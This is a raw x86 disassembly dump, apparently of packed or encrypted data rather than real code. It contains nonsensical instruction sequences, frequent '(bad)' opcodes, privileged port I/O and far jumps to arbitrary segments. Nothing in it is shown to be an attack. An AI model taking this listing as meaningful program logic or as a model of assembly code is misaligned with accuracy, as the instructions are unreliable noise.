  41ad05:	bound  edi,QWORD PTR [ebx+0x32ebb77c]
  41ad0b:	pop    esp
  41ad0c:	clc    
  41ad0d:	loop   0x41ad30
  41ad0f:	jmp    0xc300:0x2e9349e5
  41ad16:	out    0xe8,al
  41ad18:	stos   DWORD PTR es:[edi],eax
  41ad19:	ins    DWORD PTR es:[edi],dx
  41ad1a:	or     DWORD PTR [ecx+edx*2+0x2c503274],esi
  41ad21:	outs   dx,DWORD PTR ds:[esi]
  41ad22:	cmc    
  41ad23:	xlat   BYTE PTR ds:[ebx]
  41ad24:	adc    BYTE PTR [edx],dl
  41ad26:	adc    al,0x54
  41ad28:	ds push 0x1e28d2a3
  41ad2e:	cld    
  41ad2f:	pop    esi
  41ad30:	retf   
  41ad31:	in     eax,dx
  41ad32:	push   edi
  41ad33:	retf   
  41ad34:	sub    esi,DWORD PTR [ebp-0x5a]
  41ad37:	icebp  
  41ad38:	scas   al,BYTE PTR es:[edi]
  41ad39:	js     0x41ad23
  41ad3b:	call   0x365e:0x536ba790
  41ad42:	adc    DWORD PTR [esi+esi*4],edx
  41ad45:	aam    0x8d
  41ad47:	push   edi
  41ad48:	cli    
  41ad49:	lock lods al,BYTE PTR ds:[esi]
  41ad4b:	shl    BYTE PTR [ebx],1
  41ad4d:	xchg   edi,eax
  41ad4e:	mov    eax,ds:0xaa5a9c87
  41ad53:	mov    ebp,0x26769eb9
  41ad58:	ss or  al,0x4b
  41ad5b:	add    eax,0x9ff4b5f1
  41ad60:	add    al,0x84
  41ad62:	mov    eax,ds:0xcf3eab26
  41ad67:	jb     0x41addc
  41ad69:	jns    0x36fb4e19
  41ad6f:	pop    ebp
  41ad70:	xchg   DWORD PTR [esi+0x49],ebx
  41ad73:	into   
  41ad74:	loop   0x41adf1
  41ad76:	pop    ebp
  41ad77:	mov    edi,0x894667e5
  41ad7c:	xchg   edx,eax
  41ad7d:	mov    esp,fs
  41ad7f:	and    DWORD PTR [esi-0x6be7362c],eax
  41ad85:	or     eax,0x546ae7f8
  41ad8a:	adc    DWORD PTR [eax+ecx*4],0xee127e2
  41ad91:	sbb    eax,0x5f5d54c7
  41ad96:	int    0xb7
  41ad98:	push   edx
  41ad99:	pop    ebx
  41ad9a:	push   ds
  41ad9b:	inc    edi
  41ad9c:	and    dl,BYTE PTR ss:[ebp-0x19]
  41ada0:	aad    0xa5
  41ada2:	adc    BYTE PTR ds:0x6dafcd70,0x5f
  41ada9:	sbb    DWORD PTR [ecx],ecx
  41adab:	into   
  41adac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adad:	ret    
  41adae:	push   ebx
  41adaf:	push   esp
  41adb0:	arpl   WORD PTR [esi+eax*4+0x72726a3],dx
  41adb7:	add    eax,0x938cac8b
  41adbc:	loope  0x41ade7
  41adbe:	pop    ebx
  41adbf:	mov    WORD PTR [ecx],fs
  41adc1:	push   edx
  41adc2:	or     bl,BYTE PTR [edi]
  41adc4:	loop   0x41ad8b
  41adc6:	call   0x181fdf3b
  41adcb:	ins    DWORD PTR es:[edi],dx
  41adcc:	hlt    
  41adcd:	enter  0x12d4,0x1
  41add1:	pop    edx
  41add2:	fcmovu st,st(3)
  41add4:	std    
  41add5:	dec    edx
  41add6:	sub    BYTE PTR [ecx],bh
  41add8:	and    ch,cl
  41adda:	popa   
  41addb:	stos   DWORD PTR es:[edi],eax
  41addc:	sti    
  41addd:	ja     0x41ad89
  41addf:	aas    
  41ade0:	inc    edi
  41ade1:	fwait
  41ade2:	lock sbb al,BYTE PTR [ebx+0x7da4df73]
  41ade9:	(bad)  
  41adea:	xor    edx,esi
  41adec:	ret    0xfc8
  41adef:	and    al,0x28
  41adf1:	xchg   esp,eax
  41adf2:	inc    edi
  41adf3:	push   ebx
  41adf4:	xor    edx,DWORD PTR [edx+0x27bd57af]
  41adfa:	loope  0x41ae03
  41adfc:	cmp    al,0x6f
  41adfe:	dec    BYTE PTR [edx]
  41ae00:	test   ebp,edx
  41ae02:	nop
  41ae03:	call   0xfb2e:0xc004173
  41ae0a:	test   BYTE PTR [esi+eiz*4+0x1f],al
  41ae0e:	mov    cl,0xce
  41ae10:	gs jns 0x41adeb
  41ae13:	or     eax,0xec7828e5
  41ae18:	std    
  41ae19:	adc    al,0x36
  41ae1b:	jmp    0x80e5963f
  41ae20:	jg     0x41adee
  41ae22:	cs rcl dl,0x3f
  41ae26:	and    eax,0xbc990626
  41ae2b:	pop    ss
  41ae2c:	push   esp
  41ae2d:	std    
  41ae2e:	rcl    DWORD PTR ds:0x29f157b,cl
  41ae34:	xor    DWORD PTR [edx],eax
  41ae36:	mov    cl,BYTE PTR [eax]
  41ae38:	mov    dl,0x6
  41ae3a:	stc    
  41ae3b:	popf   
  41ae3c:	imul   ebx,DWORD PTR [eax],0x5e
  41ae3f:	dec    esp
  41ae40:	or     ecx,DWORD PTR [esp+esi*2-0x5e]
  41ae44:	(bad)  
  41ae45:	fimul  DWORD PTR [edi-0x111c3479]
  41ae4b:	cs xchg edi,eax
  41ae4d:	popa   
  41ae4e:	cmp    eax,0xc2c1c542
  41ae53:	popfw  
  41ae55:	imul   esi,edi,0x3e
  41ae58:	jns    0x41ae5a
  41ae5a:	cmp    edi,DWORD PTR [ebp+0xf]
  41ae5d:	popf   
  41ae5e:	popa   
  41ae5f:	inc    ebp
  41ae60:	arpl   WORD PTR [ecx+0x4843f1eb],bp
  41ae66:	test   BYTE PTR [eax+0x31778ce2],dl
  41ae6c:	inc    esi
  41ae6d:	fwait
  41ae6e:	popf   
  41ae6f:	inc    esp
  41ae70:	(bad)  
  41ae71:	fcmovnu st,st(2)
  41ae73:	dec    DWORD PTR [esi-0x75]
  41ae76:	adc    bl,dh
  41ae78:	pop    eax
  41ae79:	cmp    BYTE PTR [ebx],bh
  41ae7b:	xchg   ebp,eax
  41ae7c:	mov    dh,0x6a
  41ae7e:	push   edi
  41ae7f:	xchg   ebp,eax
  41ae80:	sbb    esi,DWORD PTR [esp+ecx*4-0x727fae37]
  41ae87:	js     0x41aebf
  41ae89:	push   eax
  41ae8a:	scas   al,BYTE PTR es:[edi]
  41ae8b:	sub    eax,0x468ce1f3
  41ae90:	mov    esi,0x62b7164
  41ae95:	test   cl,dh
  41ae97:	call   0x856c:0xfddbb1bb
  41ae9e:	push   ss
  41ae9f:	cld    
  41aea0:	pop    eax
  41aea1:	cld    
  41aea2:	es mov bl,0xa0
  41aea5:	arpl   WORD PTR [edx-0x1ace9f16],ax
  41aeab:	jge    0x41aef6
  41aead:	xchg   edx,edx
  41aeaf:	cmp    DWORD PTR [esi-0x4],ecx
  41aeb2:	cmp    DWORD PTR [edi],edi
  41aeb4:	or     bl,BYTE PTR [esi+esi*8-0x7adc975b]
  41aebb:	sub    al,0x90
  41aebd:	inc    esi
  41aebe:	test   al,0x25
  41aec0:	inc    ebp
  41aec1:	jmp    0xb768:0x587dbc21
  41aec8:	js     0x41af32
  41aeca:	fwait
  41aecb:	hlt    
  41aecc:	je     0x41af39
  41aece:	jnp    0x41ae62
  41aed0:	jmp    0x41af48
  41aed2:	cs jmp 0xaff2efe4
  41aed8:	lods   eax,DWORD PTR ds:[esi]
  41aed9:	js     0x41ae86
  41aedb:	out    0x14,eax
  41aedd:	bound  esi,QWORD PTR [esi+ebp*4-0x30348054]
  41aee4:	jno    0x41af57
  41aee6:	jl     0x41aeca
  41aee8:	pop    ds
  41aee9:	add    eax,0xbe443dfb
  41aeee:	push   eax
  41aeef:	and    BYTE PTR [edi],cl
  41aef1:	push   ecx
  41aef2:	jo     0x41af4c
  41aef4:	inc    ebx
  41aef5:	(bad)  
  41aef6:	xchg   BYTE PTR ds:[edi-0x79e72eda],cl
  41aefd:	cwde   
  41aefe:	hlt    
  41aeff:	fwait
  41af00:	stos   BYTE PTR es:[edi],al
  41af01:	mov    BYTE PTR [ebp-0x5b],dl
  41af04:	cmp    BYTE PTR [ecx],0xab
  41af07:	mov    dh,0x56
  41af09:	mov    ebp,0x7909da5e
  41af0e:	test   al,dh
  41af10:	fs inc eax
  41af12:	sbb    bl,bl
  41af14:	sub    esp,DWORD PTR [edx-0x58df7303]
  41af1a:	inc    ecx
  41af1b:	mov    WORD PTR [ecx+0x1c426d47],ss
  41af21:	clc    
  41af22:	mov    BYTE PTR [ebp-0x1fb6184a],ch
  41af28:	mov    ds:0x92ced094,al
  41af2d:	jne    0x41af8b
  41af2f:	js     0x41af5b
  41af31:	xchg   ebx,eax
  41af32:	dec    edi
  41af33:	lea    esi,[ecx]
  41af35:	jne    0x41afad
  41af37:	mov    esi,DWORD PTR [ecx+0x31]
  41af3a:	add    eax,0x579eb76b
  41af3f:	and    BYTE PTR [edx+0x7e],al
  41af42:	and    BYTE PTR [ecx],al
  41af44:	cmp    BYTE PTR [edx+0x6e070783],cl
  41af4a:	cmp    eax,0x3b7ef663
  41af4f:	mov    esp,DWORD PTR [ebp-0x759cda0b]
  41af55:	inc    edi
  41af56:	add    DWORD PTR [ebp+0x50497aa1],ecx
  41af5c:	dec    ebp
  41af5d:	jle    0x41afb4
  41af5f:	nop
  41af60:	mov    bh,cl
  41af62:	cmc    
  41af63:	and    cl,dh
  41af65:	outs   dx,DWORD PTR ds:[esi]
  41af66:	mov    eax,ds:0x95b82f83
  41af6b:	cwde   
  41af6c:	add    eax,0xf89745f0
  41af71:	jl     0x41afee
  41af73:	jbe    0x41aeff
  41af75:	mov    edi,0x719b134b
  41af7a:	fcmove st,st(3)
  41af7c:	jae    0x41af8d
  41af7e:	mov    ebp,0x8ba89c03
  41af83:	outs   dx,DWORD PTR ds:[esi]
  41af84:	hlt    
  41af85:	cli    
  41af86:	add    BYTE PTR [edi],0x44
  41af89:	aad    0xee
  41af8b:	mov    al,ds:0xd29a902
  41af90:	loop   0x41af27
  41af92:	dec    esp
  41af93:	jb     0x41af26
  41af95:	pop    edi
  41af96:	push   edi
  41af97:	pop    ecx
  41af98:	dec    esp
  41af99:	and    al,0x3c
  41af9b:	sub    ebx,DWORD PTR [esi-0x4cd95638]
  41afa1:	dec    edi
  41afa2:	jbe    0x41afa1
  41afa4:	inc    esp
  41afa5:	push   eax
  41afa6:	and    esi,DWORD PTR [eax]
  41afa8:	jmp    0x1d27:0x7e7791fb
  41afaf:	ss inc esi
  41afb1:	and    eax,0x5913b90
  41afb6:	sbb    ebx,DWORD PTR [eax+0x21741725]
  41afbc:	loope  0x41b01e
  41afbe:	mov    edi,0x58442292
  41afc3:	pushf  
  41afc4:	aaa    
  41afc5:	imul   DWORD PTR [eax-0x50]
  41afc8:	inc    esi
  41afc9:	mov    bh,0xf4
  41afcb:	or     BYTE PTR [esi],dl
  41afcd:	mov    ebx,0xc791b337
  41afd2:	dec    edi
  41afd3:	hlt    
  41afd4:	outs   dx,DWORD PTR ss:[esi]
  41afd6:	(bad)  
  41afd7:	xchg   esi,eax
  41afd8:	loopne 0x41b032
  41afda:	lods   eax,DWORD PTR ds:[esi]
  41afdb:	mov    dh,BYTE PTR [ecx]
  41afdd:	xchg   ebp,eax
  41afde:	test   al,0xaf
  41afe0:	sbb    DWORD PTR [esi],0xab7e398d
  41afe6:	xchg   BYTE PTR [edi+ecx*8],dh
  41afe9:	xchg   bh,dl
  41afeb:	cmp    al,0x5e
  41afed:	mov    eax,ds:0xbaa0ac30
  41aff2:	int3   
  41aff3:	mov    ecx,0x66b04c82
  41aff8:	rcl    DWORD PTR [ebx+eiz*1-0x3f],0xd4
  41affd:	jne    0x41afb7
  41afff:	nop
  41b000:	mov    edx,0xdc9b41b2
  41b005:	inc    edi
  41b006:	cmp    BYTE PTR [ebp+0x23c2d93a],0x89
  41b00d:	mov    bl,0xc5
  41b00f:	ret    0x274d
  41b012:	mov    bl,0xbe
  41b014:	xor    esp,DWORD PTR [edi+0x16140d0b]
  41b01a:	(bad)  
  41b01b:	push   ds
  41b01c:	inc    eax
  41b01d:	push   ds
  41b01e:	fist   DWORD PTR [edx-0x1a]
  41b021:	lea    esp,[ebp-0x70616408]
  41b027:	mov    al,ds:0xc5c5871e
  41b02c:	retf   0x1167
  41b02f:	imul   ebp,DWORD PTR [ecx],0xa1fcc9f2
  41b035:	jbe    0x41afc4
  41b037:	out    dx,eax
  41b038:	xor    al,0x3b
  41b03b:	adc    cl,BYTE PTR [ebx]
  41b03d:	bound  edi,QWORD PTR [ebx-0x1438728]
  41b043:	bound  esi,QWORD PTR [eax+edi*4-0x1df8f6fd]
  41b04a:	jecxz  0x41b0aa
  41b04c:	push   esi
  41b04d:	jmp    0x8ce5:0x8bfca155
  41b054:	test   eax,0x58d84f4c
  41b059:	pop    eax
  41b05a:	sbb    BYTE PTR [esi+0x744df71],ch
  41b060:	or     dl,BYTE PTR [esi]
  41b062:	sbb    eax,0xc27849b2
  41b067:	leave  
  41b068:	loop   0x41b049
  41b06a:	out    dx,eax
  41b06b:	pusha  
  41b06c:	and    bl,ch
  41b06e:	ds aad 0x1f
  41b071:	lea    eax,[eax-0x53]
  41b074:	jecxz  0x41b094
  41b076:	pop    ss
  41b077:	and    DWORD PTR [edi-0x21],0xfffffffb
  41b07b:	mov    dl,0xc5
  41b07d:	mov    bl,0xb
  41b07f:	sub    al,0xf
  41b081:	scas   eax,DWORD PTR es:[edi]
  41b082:	cmc    
  41b083:	dec    edx
  41b084:	leave  
  41b085:	sub    BYTE PTR [ecx-0x1b],bl
  41b088:	xchg   esp,eax
  41b089:	(bad)  
  41b08a:	enter  0xf911,0xc6
  41b08e:	out    0xa5,al
  41b090:	xchg   BYTE PTR ds:0x9a6cecb6,bh
  41b096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b097:	mul    DWORD PTR [ecx+0x494a41ca]
  41b09d:	xchg   ebp,eax
  41b09e:	mov    dl,BYTE PTR [edx-0x596a2f60]
  41b0a4:	aad    0x35
  41b0a6:	aad    0x37
  41b0a8:	sti    
  41b0a9:	std    
  41b0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0ab:	aas    
  41b0ac:	jmp    0x41b08e
  41b0ae:	clc    
  41b0af:	pop    ebp
  41b0b0:	cli    
  41b0b1:	and    edx,DWORD PTR [ebx-0x2e]
  41b0b4:	iret   
  41b0b5:	fist   WORD PTR [edx-0x52]
  41b0b8:	push   ebx
  41b0b9:	leave  
  41b0ba:	sti    
  41b0bb:	sub    edi,DWORD PTR [eax]
  41b0bd:	inc    eax
  41b0be:	mov    esp,0x1e78a821
  41b0c3:	loop   0x41b0ee
  41b0c5:	popa   
  41b0c6:	cmp    DWORD PTR [edx+ebp*2-0x30],0x4c
  41b0cb:	cmp    eax,0xcc5a5b04
  41b0d0:	pop    eax
  41b0d1:	xlat   BYTE PTR gs:[ebx]
  41b0d3:	jbe    0x41b0ea
  41b0d5:	rol    BYTE PTR [eax+0x6a385551],1
  41b0db:	jnp    0x41b0cc
  41b0dd:	retf   
  41b0de:	jbe    0x41b144
  41b0e0:	icebp  
  41b0e1:	inc    ebp
  41b0e2:	test   al,0xd9
  41b0e4:	sub    ebp,DWORD PTR [ebx]
  41b0e6:	mov    ebx,0xa0f9e9e2
  41b0eb:	push   eax
  41b0ec:	inc    ebp
  41b0ed:	ja     0x41b16b
  41b0ef:	dec    esi
  41b0f0:	ins    DWORD PTR es:[edi],dx
  41b0f1:	scas   eax,DWORD PTR es:[edi]
  41b0f2:	add    eax,0x8451d8cb
  41b0f7:	or     bl,al
  41b0f9:	rcl    DWORD PTR gs:[ebx],1
  41b0fc:	sub    ch,BYTE PTR [esi+0x6d]
  41b0ff:	add    dl,ah
  41b101:	aaa    
  41b102:	pop    ss
  41b103:	jbe    0x41b0ae
  41b105:	mov    eax,0xa179d852
  41b10a:	test   eax,0x4e54a709
  41b10f:	adc    ebx,ebp
  41b111:	outs   dx,DWORD PTR ds:[esi]
  41b112:	call   0xf1119dd7
  41b117:	imul   edx,eax,0xffffff8b
  41b11a:	mov    gs,WORD PTR [edi-0x39dce0d8]
  41b120:	mov    ebp,0xbbc65636
  41b125:	out    dx,eax
  41b126:	dec    esp
  41b127:	fwait
  41b128:	xor    al,0x27
  41b12a:	popa   
  41b12b:	jg     0x41b151
  41b12d:	mov    esp,0xcba00de9
  41b132:	lds    edx,FWORD PTR [ebx+0x5b]
  41b135:	inc    edi
  41b136:	jb     0x41b166
  41b138:	lods   eax,DWORD PTR ds:[esi]
  41b139:	mov    dh,0x4b
  41b13b:	jecxz  0x41b142
  41b13d:	clc    
  41b13e:	into   
  41b13f:	or     bl,dh
  41b141:	(bad)  
  41b142:	pusha  
  41b143:	out    dx,al
  41b144:	xor    esi,DWORD PTR [edx]
  41b146:	ficomp DWORD PTR [ecx]
  41b148:	jnp    0x41b1b7
  41b14a:	imul   ebx,DWORD PTR [ebp+0x28e74d38],0x7b
  41b151:	sbb    DWORD PTR fs:[ecx],ecx
  41b154:	sahf   
  41b155:	lds    ebx,FWORD PTR [ecx+0x69]
  41b158:	xor    DWORD PTR [edi+0x4],ebp
  41b15b:	ret    
  41b15c:	mov    esi,0xcad4d049
  41b161:	test   al,0xf
  41b163:	jnp    0x41b10f
  41b165:	in     al,0xca
  41b167:	addr16 pop edx
  41b169:	sub    al,0xdf
  41b16b:	jle    0x41b167
  41b16d:	pushaw 
  41b16f:	gs dec ecx
  41b171:	test   BYTE PTR [edi+0x357dfa9f],al
  41b177:	test   al,0x29
  41b179:	ss stc 
  41b17b:	cli    
  41b17c:	fwait
  41b17d:	cli    
  41b17e:	in     al,0x6f
  41b180:	mov    edx,DWORD PTR [ebx+0x3c]
  41b183:	int    0x4f
  41b185:	fdiv   DWORD PTR [edx-0x23e58739]
  41b18b:	pushf  
  41b18c:	sub    esi,DWORD PTR [edi]
  41b18e:	fidivr DWORD PTR [esi-0x5b78196]
  41b194:	adc    ebp,ecx
  41b196:	mov    eax,ds:0x6cad01e4
  41b19b:	les    esp,FWORD PTR [esi+0x54]
  41b19e:	test   al,0x87
  41b1a0:	fwait
  41b1a1:	cmp    al,0xf7
  41b1a3:	add    eax,0xc5805666
  41b1a8:	dec    ebx
  41b1a9:	es mov esi,0x54f83a93
  41b1af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1b0:	data16 mov cl,0x78
  41b1b3:	out    0x65,eax
  41b1b5:	lods   eax,DWORD PTR ds:[esi]
  41b1b6:	and    al,0xd0
  41b1b8:	mov    ebp,0x35fd5c69
  41b1bd:	aaa    
  41b1be:	push   edx
  41b1bf:	xchg   sp,ax
  41b1c1:	xchg   esi,eax
  41b1c2:	inc    ebp
  41b1c3:	sub    ecx,DWORD PTR [eax]
  41b1c5:	scas   eax,DWORD PTR es:[edi]
  41b1c6:	mov    bl,0xb7
  41b1c8:	sahf   
  41b1c9:	daa    
  41b1ca:	sub    dl,BYTE PTR [ecx+eax*1]
  41b1cd:	push   ecx
  41b1ce:	mov    eax,0xc0413613
  41b1d3:	aad    0xb0
  41b1d5:	jne    0x41b1a6
  41b1d7:	popf   
  41b1d8:	test   al,0xfa
  41b1da:	push   edi
  41b1db:	sti    
  41b1dc:	jmp    0x4ec404c4
  41b1e1:	sbb    ebx,eax
  41b1e3:	mov    ebx,0xcf3cb477
  41b1e8:	f2xm1  
  41b1ea:	cmc    
  41b1eb:	jae    0x41b225
  41b1ed:	loopne 0x41b1fa
  41b1ef:	pushf  
  41b1f0:	sbb    esp,DWORD PTR [eax]
  41b1f2:	out    0x0,al
  41b1f4:	jae    0x41b25c
  41b1f6:	xchg   bl,al
  41b1f8:	jge    0x41b1fe
  41b1fa:	std    
  41b1fb:	pop    ds
  41b1fc:	xor    edx,DWORD PTR ds:0x38fe574b
  41b202:	mov    cl,0xe1
  41b204:	lds    ebx,FWORD PTR ds:0x3a6b307d
  41b20a:	dec    ecx
  41b20b:	mov    ds:0xa06b2a02,al
  41b210:	enter  0xe5ae,0x2
  41b214:	in     al,dx
  41b215:	pop    ebp
  41b216:	aad    0x22
  41b218:	or     ebx,DWORD PTR [ecx-0x11]
  41b21b:	ja     0x41b299
  41b21d:	push   edi
  41b21e:	retf   0x6aab
  41b221:	xor    al,0x75
  41b223:	mov    bh,0x85
  41b225:	(bad)  
  41b226:	ds (bad) 
  41b228:	and    edx,DWORD PTR [esp+ecx*4]
  41b22b:	jbe    0x41b24e
  41b22d:	dec    ebp
  41b22e:	mov    eax,ds:0xa084387c
  41b233:	or     BYTE PTR gs:[eax+0x5766883],ah
  41b23a:	out    0xe0,eax
  41b23c:	sti    
  41b23d:	les    ebx,FWORD PTR [ebp+0x49233801]
  41b243:	jl     0x41b260
  41b245:	mov    edi,0xe56d3c8f
  41b24a:	xor    eax,0x82979698
  41b24f:	int    0x70
  41b251:	mov    ecx,0x11182717
  41b256:	jmp    0x41b243
  41b258:	ins    BYTE PTR es:[edi],dx
  41b259:	mov    dl,0x61
  41b25b:	enter  0x3251,0xd7
  41b25f:	jns    0x41b2a0
  41b261:	xchg   DWORD PTR [eax-0x44ffa64c],ebp
  41b267:	ss fneni(8087 only) 
  41b26a:	xchg   dl,ch
  41b26c:	xchg   ecx,eax
  41b26d:	scas   al,BYTE PTR es:[edi]
  41b26e:	xor    eax,DWORD PTR [edi-0x15]
  41b271:	push   esi
  41b272:	jo     0x41b2e9
  41b274:	mov    ebp,0x7bdf0d5a
  41b279:	iret   
  41b27a:	ins    DWORD PTR es:[edi],dx
  41b27b:	test   BYTE PTR ds:0x4667e85,cl
  41b281:	icebp  
  41b282:	(bad)  
  41b283:	jg     0x41b2ac
  41b285:	jecxz  0x41b292
  41b287:	or     DWORD PTR [edx+0x13],0xffffffc0
  41b28b:	fiadd  WORD PTR [edi+0x69]
  41b28e:	xchg   ecx,eax
  41b28f:	push   ebp
  41b290:	ret    
  41b291:	mov    dh,bl
  41b293:	pop    eax
  41b294:	jg     0x41b2b3
  41b296:	add    DWORD PTR [ebp+0x4b28d6eb],esp
  41b29c:	je     0x41b2f2
  41b29e:	into   
  41b29f:	out    0x61,al
  41b2a1:	ret    
  41b2a2:	push   ds
  41b2a3:	xchg   ebp,eax
  41b2a4:	jmp    0xe0f6:0xd2711058
  41b2ab:	cld    
  41b2ac:	add    DWORD PTR [ebp-0x26d987ab],0xffffff82
  41b2b3:	push   ss
  41b2b4:	add    bl,dl
  41b2b6:	sbb    al,BYTE PTR [ebx-0x1c]
  41b2b9:	test   ebx,0x46d09439
  41b2bf:	dec    esp
  41b2c0:	imul   BYTE PTR [ebx-0x6a]
  41b2c3:	cmp    esp,ebp
  41b2c5:	or     bl,BYTE PTR [esi+0x166a4632]
  41b2cb:	xchg   edi,eax
  41b2cc:	(bad)  
  41b2cd:	or     bl,BYTE PTR [ebx]
  41b2cf:	adc    eax,0xd3788cad
  41b2d4:	ret    
  41b2d5:	mul    esp
  41b2d7:	mov    esp,0x43c52e6c
  41b2dc:	push   esi
  41b2dd:	push   ecx
  41b2de:	mov    DWORD PTR [esi+0xb03fa9f],esi
  41b2e4:	out    0xca,al
  41b2e6:	lods   al,BYTE PTR ds:[esi]
  41b2e7:	mov    ds:0x89f59500,eax
  41b2ec:	mov    ebp,0xe7a83c7a
  41b2f1:	dec    eax
  41b2f2:	jge    0x41b373
  41b2f4:	fcmovnb st,st(1)
  41b2f6:	mov    al,ds:0x9cbc21c7
  41b2fb:	jns    0x41b2c4
  41b2fd:	xchg   ecx,eax
  41b2fe:	xchg   esi,eax
  41b2ff:	les    edi,FWORD PTR [ebx]
  41b301:	dec    ecx
  41b302:	imul   esp,DWORD PTR ds:0xae074ad2,0xffffffe9
  41b309:	dec    ebx
  41b30a:	fisttp WORD PTR [ebp-0x28]
  41b30d:	and    bh,dl
  41b30f:	fidivr WORD PTR [eax+0x12]
  41b312:	inc    edi
  41b313:	jb     0x41b385
  41b315:	xchg   esp,eax
  41b316:	add    DWORD PTR [esi+0x42204f4d],esi
  41b31c:	inc    ecx
  41b31d:	pop    esi
  41b31e:	mov    al,BYTE PTR [eax]
  41b320:	dec    ebp
  41b321:	add    esi,DWORD PTR [ebp+0x6e]
  41b324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b325:	xor    al,0xd5
  41b327:	sub    al,0x78
  41b329:	cld    
  41b32a:	inc    edi
  41b32b:	(bad)  
  41b32c:	sbb    esi,DWORD PTR [edi-0x77]
  41b32f:	inc    ecx
  41b330:	jmp    0xfc92:0x1ceb4ae9
  41b337:	sub    BYTE PTR fs:[eax],dl
  41b33a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b33b:	loopne 0x41b343
  41b33d:	mov    dl,0x1c
  41b33f:	xor    eax,0xcf6afe97
  41b344:	icebp  
  41b345:	enter  0x29c,0x19
  41b349:	std    
  41b34a:	stos   BYTE PTR es:[edi],al
  41b34b:	and    edx,DWORD PTR [edi-0x66]
  41b34e:	clc    
  41b34f:	fisubr WORD PTR [edx+ebx*1]
  41b352:	xor    DWORD PTR [esi],edi
  41b354:	nop    edx
  41b357:	cli    
  41b358:	pop    ebx
  41b359:	inc    eax
  41b35a:	sbb    eax,0xf7ce71f1
  41b35f:	(bad)  
  41b360:	mov    edx,0xf1d9d8e6
  41b365:	(bad)  
  41b366:	fiadd  DWORD PTR gs:[ecx]
  41b369:	pop    edi
  41b36a:	ja     0x41b3d5
  41b36c:	xchg   ebp,eax
  41b36d:	jl     0x41b355
  41b36f:	out    0x50,eax
  41b371:	daa    
  41b372:	dec    ebp
  41b373:	cld    
  41b374:	sahf   
  41b375:	rol    BYTE PTR [eax-0x419a7fd5],0x80
  41b37c:	cmp    eax,0xbd5516c7
  41b381:	retf   0x7639
  41b384:	and    al,0xe6
  41b386:	xchg   esp,eax
  41b387:	mov    al,ds:0xcaebde51
  41b38c:	mov    BYTE PTR [eax-0x5a289c94],bh
  41b392:	div    BYTE PTR [esi+0x4b38f57a]
  41b398:	test   BYTE PTR ds:0xac7070ff,ch
  41b39e:	test   DWORD PTR [edi+0x0],edi
  41b3a1:	add    al,0xb9
  41b3a3:	stos   BYTE PTR es:[edi],al
  41b3a4:	push   ecx
  41b3a5:	cmp    BYTE PTR [ecx+0x49],0x2e
  41b3a9:	(bad)  
  41b3aa:	idiv   BYTE PTR [eax-0x4]
  41b3ad:	mov    ebp,DWORD PTR [ebx-0x68]
  41b3b0:	in     eax,dx
  41b3b1:	into   
  41b3b2:	int    0x7
  41b3b4:	lahf   
  41b3b5:	cld    
  41b3b6:	jno    0x41b420
  41b3b8:	nop
  41b3b9:	retf   0xe351
  41b3bc:	push   eax
  41b3bd:	sbb    al,0xd9
  41b3bf:	sub    al,0x36
  41b3c1:	adc    al,0x5f
  41b3c3:	jmp    DWORD PTR [ebx]
  41b3c5:	mov    esp,?
  41b3c7:	xor    esi,DWORD PTR ds:0x5b0f7e33
  41b3cd:	sub    ah,BYTE PTR [edx]
  41b3cf:	lock cwde 
  41b3d1:	lods   al,BYTE PTR ds:[esi]
  41b3d2:	cmp    dl,BYTE PTR gs:[ebp+ecx*1+0x672a251e]
  41b3da:	and    edx,DWORD PTR [edi-0x55ffbf84]
  41b3e0:	inc    ecx
  41b3e1:	xchg   DWORD PTR [ebx+eiz*4],ebp
  41b3e4:	mov    esp,ebp
  41b3e6:	ja     0x41b454
  41b3e8:	mov    ebp,0x7c427eb2
  41b3ed:	ret    
  41b3ee:	xlat   BYTE PTR ds:[ebx]
  41b3ef:	sub    ecx,DWORD PTR [eax-0x51]
  41b3f2:	shl    esi,cl
  41b3f4:	dec    ecx
  41b3f5:	imul   esp,DWORD PTR [edx],0x2b
  41b3f8:	cmp    eax,DWORD PTR [ebx-0x1238527e]
  41b3fe:	dec    BYTE PTR [ebp+0x17]
  41b401:	lods   eax,DWORD PTR ds:[esi]
  41b402:	inc    ebp
  41b403:	jae    0x41b3c2
  41b405:	mov    ch,0x7e
  41b407:	ret    
  41b408:	sahf   
  41b409:	mov    ecx,0xed291d78
  41b40e:	ss jmp 0x93800922
  41b414:	out    dx,eax
  41b415:	inc    eax
  41b416:	xchg   ebx,eax
  41b417:	xor    ch,BYTE PTR [ebp-0x70]
  41b41a:	add    esp,ecx
  41b41c:	fs adc ebp,edi
  41b41f:	enter  0xc8e9,0x1
  41b423:	xchg   esi,eax
  41b424:	outs   dx,BYTE PTR ds:[esi]
  41b425:	push   edi
  41b426:	cmc    
  41b427:	sbb    DWORD PTR [ecx-0x13efdbee],edx
  41b42d:	ds scas eax,DWORD PTR es:[edi]
  41b42f:	sbb    al,0x9b
  41b431:	fucomip st,st(3)
  41b433:	mov    ds:0x5538c38a,al
  41b438:	jns    0x41b3bc
  41b43a:	loopne 0x41b421
  41b43c:	adc    al,0xe9
  41b43e:	outs   dx,DWORD PTR ds:[esi]
  41b43f:	xchg   ecx,eax
  41b440:	jg     0x41b49d
  41b442:	repnz out 0xca,eax
  41b445:	mov    ds:0xac46b0c4,al
  41b44a:	push   ecx
  41b44b:	test   DWORD PTR [edx],esi
  41b44d:	ss mov edi,0xe0ab745e
  41b453:	xor    DWORD PTR [ebp-0x4e],0xb4628c1b
  41b45a:	inc    eax
  41b45b:	jae    0x41b445
  41b45d:	inc    ebx
  41b45e:	add    dh,BYTE PTR [edx-0x57e0d832]
  41b464:	xor    DWORD PTR [ebp+0x41c5ee85],esi
  41b46a:	(bad)  [eax-0x66]
  41b46d:	xor    BYTE PTR [edx+0x4efed765],bl
  41b473:	adc    DWORD PTR ds:0xc679e682,edx
  41b479:	push   ecx
  41b47a:	sub    esp,ecx
  41b47c:	jb     0x41b416
  41b47e:	jp     0x41b421
  41b480:	call   0x2115:0x4915bc22
  41b487:	mov    dl,0x6e
  41b489:	ja     0x41b4d9
  41b48b:	push   0x19d2729a
  41b490:	pop    ecx
  41b491:	inc    esp
  41b492:	or     ch,BYTE PTR ds:0xb2dd03da
  41b499:	jo     0x41b48d
